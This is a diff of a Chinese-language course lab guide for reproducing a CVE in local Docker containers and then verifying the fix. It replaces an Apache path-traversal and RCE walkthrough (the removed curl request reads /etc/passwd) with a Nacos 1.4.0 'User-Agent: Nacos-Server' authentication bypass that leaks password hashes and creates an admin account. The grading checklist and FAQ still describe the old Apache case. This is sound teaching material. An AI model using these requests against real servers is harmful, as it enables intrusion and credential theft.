@@ -116,55 +116,38 @@ docker run --rm hello-world
 
    看到 `Hello from Docker!` 就成了。
 
-> 装不上（比如 `wsl --install` 返回 403、DISM 被策略锁住、
-> 或者公司机器禁虚拟化）就走备选方案：
-> 浏览器打开 <https://labs.play-with-docker.com> 建临时实例，
-> 完整命令见 **[《用 Play with Docker 跑 CVE》](PWD.md)**。
+> 装不上时（`wsl --install` 返回 403、DISM 被策略锁住等）常见解法：
+> 用 DISM 离线启用 `VirtualMachinePlatform`，重启后从 GitHub releases 装 WSL 的 MSI，
+> 最后 `winget install --exact --id Docker.DockerDesktop`（本机就是这么装通的）。
 
 ---
 
-### 方案 D：不装 Docker，直接在 GitHub 上跑
-
-仓库里有 `.github/workflows/cve-repro.yml`，**手动触发**即可在 GitHub 的 runner
-（自带 Docker）上完成整套复现 —— 不需要你本机装任何东西：
-
-1. push 仓库后打开 **Actions** → 左侧 **CVE reproduction (manual)** → **Run workflow**；
-2. 等约 3–5 分钟；
-3. 结果出现在两处：
-   * 这次运行的 **Summary** 页面（漏洞版与修复版的完整转录）；
-   * Artifacts 里的 `cve-evidence.zip`。
-
-这份转录带时间戳、可复跑，比本地手工截图更硬；报告里可以引用运行链接。
-（该工作流只手动触发，不会在 push 时自动执行，且 runner 用完即销毁。）
-
----
 
 ## 阶段 4 — 启动漏洞环境并复现 CVE
 
 **✅ 已完成**：`cve/Dockerfile`、`cve/docker-compose.yml`、利用脚本、验证脚本。
 
-**👉 你来做**——最省事的方式是一条命令跑完阶段 4 和阶段 5：
+**👉 你来做**——一条命令跑完阶段 4 和阶段 5：
 
 ```powershell
 cd .\cve
-powershell -ExecutionPolicy Bypass -File .\run-all.ps1   # 加 -KeepRunning 可以在截图时让容器留着
-
-> 若提示“无法加载文件 … 未数字签名”，说明 PowerShell 执行策略是 Restricted（Windows PowerShell 默认）。两种解法：用 `powershell -ExecutionPolicy Bypass -File .\xxx.ps1`，或先执行一次 `Set-ExecutionPolicy -Scope Process Bypass`。
-
+powershell -ExecutionPolicy Bypass -File .\run-all.ps1
 ```
 
-它会依次：起漏洞版 → 打 → 关 → 起修复版 → 重放并断言失败 → 关，
+它会依次：起 Nacos 1.4.0 → 打 → 关 → 起修复版 1.4.1 → 重放并断言失败 → 关，
 把两份原始输出写到 `cve\evidence\`，最后打印 SUMMARY。
-**只有"漏洞版确实被打穿"且"修复版确实全部拒绝"时才 exit 0**，否则会明确告诉你哪一步不对。
+**只有"漏洞版确实被打穿"且"修复版确实全部拒绝"时才 exit 0**。
 
-下面是等价的**手动**步骤，适合你一步步截图：
+下面是等价的**手动**步骤，适合一步步截图：
 
 ```powershell
 cd .\cve
-docker compose up -d --build          # 第一次会拉 55 MB 左右的镜像
+docker compose up -d --build          # 首次会下载 Nacos 1.4.0 发行包（约 100 MB）
 docker compose ps                     # 状态应为 Up
-curl.exe -s http://127.0.0.1:8080/    # 应返回 It works!
+curl.exe -s -o NUL -w "%{http_code}`n" http://127.0.0.1:8848/nacos/   # 200
 ```
+
+> Nacos 是 Spring Boot 应用，`up` 之后要等 **30–60 秒**才能访问。
 
 复现攻击：
 
@@ -175,22 +158,21 @@ powershell -ExecutionPolicy Bypass -File .\exploit.ps1
 预期看到：
 
 ```
-2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
-HTTP 200
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
->>> VULNERABLE: /etc/passwd was disclosed.
+2. Baseline: GET /nacos/v1/auth/users without credentials
+HTTP 403
+{"status":403,"error":"Forbidden","message":"unknown user!"}
 
-3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
->>> VULNERABLE: command execution confirmed.
+3. Bypass: same request with 'User-Agent: Nacos-Server'
+HTTP 200
+{"totalCount":1,...,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}
+>>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.
+
+4. Impact: create an admin account through the same bypass
+{"code":200,"message":"create user ok!","data":null}
+>>> VULNERABLE: 'pwned4779' was created without any credentials
 ```
 
-**截图** → `docs/screenshots/cve-exploit.png`
-（要包含命令行 + `root:x:0:0` + `uid=` 三样，缺一不可）
-
-> 没有 `curl.exe`？Windows 10 1803+ 自带；或把脚本里的 `$curl = "curl.exe"` 改成绝对路径。
+**截图** → `docs\screenshots\cve-exploit.png`（要包含 403 基线、200 泄露、`create user ok!`）
 
 ---
 
@@ -208,17 +190,12 @@ powershell -ExecutionPolicy Bypass -File .\verify-fix.ps1
 RESULT: fix verified -- all checks passed.
 ```
 
-**截图** → `docs/screenshots/cve-fixed.png`
-（要包含 `HTTP 400` 和 `RESULT: fix verified`）
+**截图** → `docs\screenshots\cve-fixed.png`（要包含 `HTTP 403` 和 `RESULT: fix verified`）
 
-顺手对比一下两条命令：
+> 修复不只是"升到 1.4.1"：1.4.1 只是引入 `userAgentAuthWhite` 开关且默认开着，
+> 还得把它关掉并配一对 server identity。细节见 `cve/README.md` 第 6 节。
 
-```powershell
-# 漏洞版（先 up 漏洞版才能对比）
-curl.exe -sS --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-```
-
-整理完容器：
+整理容器：
 
 ```powershell
 docker compose -f docker-compose.fixed.yml down
@@ -271,7 +248,7 @@ python scripts\build_report.py --pdf
 - [ ] 1 分 — JWT + bcrypt 都能演示（401 无令牌 / 200 有令牌 / 伪造令牌被拒）
 - [ ] 2 分 — CI 有 Bandit + pip-audit，且截图能看到报告
 - [ ] 2 分 — `root:x:0:0` 截图（CVE 复现成功）
-- [ ] 1 分 — 报告 4.3 节根因分析（解码/判断顺序、配置放大、2.4.50 为何不够）
+- [ ] 1 分 — 报告 4.3 节根因分析（信任请求头、认证开关的前提、1.4.1 为何还不够）
 - [ ] 1 分 — 修复后 400 + 回归通过截图
 
 ## 常见问题
@@ -279,8 +256,8 @@ python scripts\build_report.py --pdf
 **Q：`docker compose up` 卡在 pull？**
 配镜像加速（Docker Desktop → Settings → Docker Engine 加 `registry-mirrors`），或换网络重试。
 
-**Q：端口 8080 被占用？**
-改 `cve/docker-compose.yml` 里的 `"8080:80"` 为 `"8081:80"`，脚本加 `-Target http://127.0.0.1:8081`。
+**Q：端口 8848 被占用？**
+改 `cve/docker-compose.yml` 里的 `"8848:8848"` 为 `"8849:8848"`，脚本加 `-Target http://127.0.0.1:8849`。
 
 **Q：`exploit.ps1` 报 403 而不是 200？**
 说明 `<Directory /> Require all granted` 没生效（镜像没重新 build）。`docker compose up -d --build --force-recreate`。
